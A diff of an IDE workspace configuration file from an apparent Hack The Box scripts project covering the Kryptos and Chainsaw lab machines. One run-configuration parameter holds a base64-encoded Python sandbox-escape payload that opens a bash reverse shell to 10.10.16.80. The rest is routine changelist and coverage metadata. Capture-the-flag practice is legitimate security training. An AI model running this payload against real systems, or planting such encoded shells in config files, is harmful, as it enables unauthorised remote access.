@@ -2,9 +2,8 @@
 <project version="4">
   <component name="ChangeListManager">
     <list default="true" id="bb6e27c4-5f7a-4f97-8c3a-1dbd185762fd" name="Default Changelist" comment="">
-      <change afterPath="$PROJECT_DIR$/kryptos-root-jsonreq.py" afterDir="false" />
       <change beforePath="$PROJECT_DIR$/.idea/workspace.xml" beforeDir="false" afterPath="$PROJECT_DIR$/.idea/workspace.xml" afterDir="false" />
-      <change beforePath="$PROJECT_DIR$/assets/local_web_kryptos.py" beforeDir="false" afterPath="$PROJECT_DIR$/assets/local_web_kryptos.py" afterDir="false" />
+      <change beforePath="$PROJECT_DIR$/kryptos-root-jsonreq.py" beforeDir="false" afterPath="$PROJECT_DIR$/kryptos-root-jsonreq.py" afterDir="false" />
     </list>
     <option name="EXCLUDED_CONVERTED_TO_IGNORED" value="true" />
     <option name="SHOW_DIALOG" value="false" />
@@ -256,7 +255,7 @@
       <option name="ADD_SOURCE_ROOTS" value="true" />
       <EXTENSION ID="PythonCoverageRunConfigurationExtension" runner="coverage.py" />
       <option name="SCRIPT_NAME" value="$PROJECT_DIR$/kryptos-root-jsonreq.py" />
-      <option name="PARAMETERS" value="" />
+      <option name="PARAMETERS" value="CihsYW1iZGEgX19idWlsdGluc19fPShbeCBmb3IgeCBpbiAoMSkuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgaWYgeC5fX25hbWVfXyA9PSAnY2F0Y2hfd2FybmluZ3MnXVswXSgpLl9tb2R1bGUuX19idWlsdGluc19fKToKICAgIF9fYnVpbHRpbnNfX1sncHJpbnQnXShfX2J1aWx0aW5zX19bJ19faW1wb3J0X18nXSgnb3MnKS5zeXN0ZW0oImJhc2ggLWMgJ2Jhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNi44MC8xNTUwMCAwPCYxJyIpKQopKCkK" />
       <option name="SHOW_COMMAND_LINE" value="false" />
       <option name="EMULATE_TERMINAL" value="false" />
       <option name="MODULE_MODE" value="false" />
@@ -344,7 +343,7 @@
       <workItem from="1564066256910" duration="5712000" />
       <workItem from="1564111761681" duration="302000" />
       <workItem from="1564112106444" duration="10228000" />
-      <workItem from="1564131400686" duration="4534000" />
+      <workItem from="1564131400686" duration="8134000" />
     </task>
     <servers />
   </component>
@@ -377,7 +376,7 @@
   </component>
   <component name="com.intellij.coverage.CoverageDataManagerImpl">
     <SUITE FILE_PATH="coverage/htbscripts$chainsaw_web3_smart_contract.coverage" NAME="chainsaw-web3-smart-contract Coverage Results" MODIFIED="1563943513209" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$" />
-    <SUITE FILE_PATH="coverage/htbscripts$kryptos_root_jsonreq.coverage" NAME="kryptos-root-jsonreq Coverage Results" MODIFIED="1564134771434" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$" />
+    <SUITE FILE_PATH="coverage/htbscripts$kryptos_root_jsonreq.coverage" NAME="kryptos-root-jsonreq Coverage Results" MODIFIED="1564146060143" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$" />
     <SUITE FILE_PATH="coverage/htbscripts$kryptos_vimcrypt.coverage" NAME="kryptos-vimcrypt Coverage Results" MODIFIED="1564067970578" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$" />
     <SUITE FILE_PATH="coverage/htbscripts$local_web_kryptos.coverage" NAME="local_web_kryptos Coverage Results" MODIFIED="1564134753532" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$/assets" />
     <SUITE FILE_PATH="coverage/htbscripts$krypto_user_loginpanel.coverage" NAME="krypto-user-loginpanel Coverage Results" MODIFIED="1564067963730" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="coverage.py" COVERAGE_BY_TEST_ENABLED="true" COVERAGE_TRACING_ENABLED="false" WORKING_DIRECTORY="$PROJECT_DIR$" />
